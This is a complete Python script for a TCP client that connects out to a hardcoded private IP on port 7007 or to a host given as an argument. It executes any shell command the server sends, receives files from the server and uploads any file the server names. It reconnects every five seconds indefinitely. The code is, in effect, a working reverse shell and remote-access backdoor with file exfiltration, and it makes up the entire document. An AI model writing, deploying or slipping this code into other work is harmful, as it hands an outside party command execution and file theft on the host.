import socket
import subprocess
from pathlib import Path
import sys
import time

def tcp_client():
    print("client starting")
    
    # Use from argument or default
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.70.6"
    server_address = (host, 7007)

    client_socket = socket.socket()

    try:
        client_socket.connect(server_address)
        print(f"Connected to {server_address[0]}:{server_address[1]}")

        while True:
            # Read header until \n
            header = client_socket.recv(1024).decode("utf-8").strip()

            # --- CMD: Execute shell command and return output ---
            if header.startswith("cmd:"):
                # Everything after "cmd:" is the command
                command = header[4:]
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output:
                    output = "(no output)"
                print(f"Command: {command}, Output: {output}")
                # Send output with \n so server knows when it ends
                client_socket.sendall((output + "\n").encode("utf-8"))

            # --- SEND: Receive a file from server ---
            elif header.startswith("send:"):
                # Split only at last : to handle Windows path
                parts = header.rsplit(":", 1)
                filename = parts[0][5:] # Everything after "send:"
                filesize = int(parts[1])

                file_data = b""
                while len(file_data) < filesize:
                    remaining = filesize - len(file_data)
                    chunk = client_socket.recv(min(65535, remaining))
                    if not chunk:
                        break
                    file_data += chunk

                # Save using only filename, not full path from server
                save_name = Path(filename).name
                with open(save_name, 'wb') as f:
                    f.write(file_data)
                print(f"File saved: {save_name}")
                client_socket.sendall(f"File saved: {save_name}\n".encode("utf-8"))

            # --- GET: Send a file to server ---
            elif header.startswith("get:"):
                # Everything after "get:" is the filename/path
                filename = header[4:]
                print(f"GET: {filename}")
                file = Path(filename)

                if not file.exists():
                    client_socket.sendall(f"Error: file not found: {filename}\n".encode("utf-8"))
                    print("Error: File not found")
                    continue

                filesize = file.stat().st_size
                # Send header with filesize
                response_header = f"get:{filename}:{filesize}\n"
                client_socket.sendall(response_header.encode("utf-8"))

                with open(filename, "rb") as f:
                    file_data = f.read()
                client_socket.sendall(file_data)
                print(f"File sent: {filename}")

    except socket.error as err:
        print(f"Error: {err}")
    except KeyboardInterrupt:
        print("Disconnecting")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    while True:
        try:
            tcp_client()
        except Exception as e:
            print(f"Disconnected: {e}, reconnecting in 5 seconds...")
            time.sleep(5)